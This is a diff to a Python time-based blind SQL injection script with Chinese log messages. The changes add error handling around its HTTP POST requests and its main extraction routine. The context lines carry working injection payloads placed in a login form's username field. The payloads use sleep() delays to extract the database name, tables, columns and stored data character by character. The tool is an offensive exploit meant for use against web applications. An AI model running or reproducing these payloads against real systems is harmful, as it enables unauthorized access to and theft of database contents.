@@ -64,7 +64,10 @@ def get_length_database():
         # 开始时间
         start_time = time.time()
         # post传参
-        requests.post(url, data=data)
+        try:
+            requests.post(url, data=data)
+        except:
+            logger.error("网络链接失败....")
         # 结束时间
         end_time = time.time()
         use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
@@ -79,7 +82,10 @@ def check_database(parameter):
     payload = "test' and if(ascii(substr(database(),{0},1))={1},sleep(3),null)#".format(n, ord(v))
     data = {"username": payload, "password": '123'}
     start_time = time.time()
-    requests.post(url, data=data)
+    try:
+        requests.post(url, data=data)
+    except:
+        logger.error("网络链接失败....")
     end_time = time.time()
     use_time = end_time - start_time
     if use_time > 1.8:return True
@@ -115,7 +121,10 @@ def get_table_num():
         # 开始时间
         start_time = time.time()
         # post传参
-        requests.post(url, data=data)
+        try:
+            requests.post(url, data=data)
+        except:
+            logger.error("网络链接失败....")
         # 结束时间
         end_time = time.time()
         use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
@@ -132,7 +141,10 @@ def check_length_table(parameter):
         payload = "test' and if((select length(table_name) from information_schema.tables where table_schema=database() limit {0},1)={1},sleep(2),1) #".format(i, n)
         data = {"username": payload, "password": '123'}
         start_time = time.time()
-        requests.post(url, data=data)
+        try:
+            requests.post(url, data=data)
+        except:
+            logger.error("网络链接失败....")
         end_time = time.time()
         use_time = end_time - start_time  # 求出请求前后的时间差来判断是否延时了
         if use_time > 1.8:
@@ -154,7 +166,10 @@ def check_table(parameter):
     payload = "test' and if(ascii(substr((select table_name from information_schema.tables where table_schema =database() limit {0},1),{1},1))={2},sleep(2),null) #".format(i, j, ord(v))
     data = {"username": payload, "password": '123'}
     start_time = time.time()
-    requests.post(url, data=data)
+    try:
+        requests.post(url, data=data)
+    except:
+        logger.error("网络链接失败....")
     end_time = time.time()
     use_time = end_time - start_time
     if use_time > 1.8:return True
@@ -186,7 +201,10 @@ def check_num_column(parameter):
         payload = "test' and if((select count(*) from information_schema.columns where table_name='{0}')={1},sleep(2),1) #".format(table, n)
         data = {"username": payload, "password": '123'}
         start_time = time.time()
-        requests.post(url, data=data)
+        try:
+            requests.post(url, data=data)
+        except:
+            logger.error("网络链接失败....")
         end_time = time.time()
         use_time = end_time - start_time
         if use_time > 1.8:return n
@@ -208,7 +226,10 @@ def check_length_column(parameter):
         payload = "test' and if((select length(column_name) from information_schema.columns where table_name='{0}' limit {1},1)={2},sleep(2),1) #".format(table, j, n)
         data = {"username": payload, "password": '123'}
         start_time = time.time()
-        requests.post(url, data=data)
+        try:
+            requests.post(url, data=data)
+        except:
+            logger.error("网络链接失败....")
         end_time = time.time()
         use_time = end_time - start_time
         if use_time > 1.8:return n
@@ -228,7 +249,10 @@ def check_column(parameter):
     payload = "test' and if(ascii(substr((select column_name from information_schema.columns where table_name='{0}' limit {1}, 1), {2},1))={3},sleep(2),null) #".format(table, i, j, ord(v))
     data = {"username": payload, "password": '123'}
     start_time = time.time()
-    requests.post(url, data=data)
+    try:
+        requests.post(url, data=data)
+    except:
+        logger.error("网络链接失败....")
     end_time = time.time()
     use_time = end_time - start_time
     if use_time > 1.8:return True
@@ -293,7 +317,10 @@ def get_num_data(table,column):
         payload = "test' and if((select count(*) from {0})={1},sleep(2),1) #".format(table, n)
         data = {"username": payload, "password": '123'}
         start_time = time.time()
-        requests.post(url, data=data)
+        try:
+            requests.post(url, data=data)
+        except:
+            logger.error("网络链接失败....")
         end_time = time.time()
         use_time = end_time - start_time
         if use_time > 1.8:
@@ -308,7 +335,10 @@ def check_length_data(parameter):
         payload = "test' and if((select length({0}) from {1} limit {2}, 1)={3},sleep(2),null) #".format(column, table,i, n)
         data = {"username": payload, "password": '123'}
         start_time = time.time()
-        requests.post(url, data=data)
+        try:
+            requests.post(url, data=data)
+        except:
+            logger.error("网络链接失败....")
         end_time = time.time()
         use_time = end_time - start_time
         if use_time > 1.8:return n
@@ -328,7 +358,10 @@ def check_data(parameter):
     payload = "test' and if(ascii(substr((select {0} from {1} limit {2}, 1), {3},1))={4},sleep(2),null) #".format(column, table, i, j, ord(v))
     data = {"username": payload, "password": '123'}
     start_time = time.time()
-    requests.post(url, data=data)
+    try:
+        requests.post(url, data=data)
+    except:
+        logger.error("网络链接失败....")
     end_time = time.time()
     use_time = end_time - start_time
     if use_time > 1.8:return True
@@ -363,32 +396,35 @@ if __name__ == "__main__":
     url = args.url
 
     if args.get == 'all':
-        logger.info('{0}  正在获取当前数据库名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_length_database()
-        logger.info('{0}  正在获取当前数据库名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_database(url)
-        print("\r", ".....the database name is :" + haveget['database']['curr'], flush=True)
-        logger.info('{0}  正在获取当前数据库内表单数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_table_num()
-        logger.info('{0}  正在获取表单名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_length_table()
-        logger.info('{0}  正在获取当前数据库表名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_table(url)
-        logger.info('{0}  正在获取当前各表列数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_column_num(url)
-        logger.info('{0}  正在获取各列名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_length_column(url)
-        logger.info('{0}  正在获取当前表列名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_column(url)
-        # 处理选择
-        chooseTable,chooseColumn=resolve_choose()
-        logger.info('{0}  获取表单数据行数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_num_data(chooseTable,chooseColumn)
-        logger.info('{0}  获取数据长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_length_data(chooseTable, chooseColumn,url)
-        logger.info('{0}  获取数据......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
-        get_data(chooseTable,chooseColumn,url)
-        logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+        try:
+            logger.info('{0}  正在获取当前数据库名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_length_database()
+            logger.info('{0}  正在获取当前数据库名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_database(url)
+            print("\r", ".....the database name is :" + haveget['database']['curr'], flush=True)
+            logger.info('{0}  正在获取当前数据库内表单数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_table_num()
+            logger.info('{0}  正在获取表单名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_length_table()
+            logger.info('{0}  正在获取当前数据库表名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_table(url)
+            logger.info('{0}  正在获取当前各表列数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_column_num(url)
+            logger.info('{0}  正在获取各列名长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_length_column(url)
+            logger.info('{0}  正在获取当前表列名......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_column(url)
+            # 处理选择
+            chooseTable,chooseColumn=resolve_choose()
+            logger.info('{0}  获取表单数据行数......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_num_data(chooseTable,chooseColumn)
+            logger.info('{0}  获取数据长度......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_length_data(chooseTable, chooseColumn,url)
+            logger.info('{0}  获取数据......'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+            get_data(chooseTable,chooseColumn,url)
+            logger.info('{0}  获取完毕！'.format(time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())))
+        except:
+            logger.error("注入目标非时间盲注....")
 
 
 
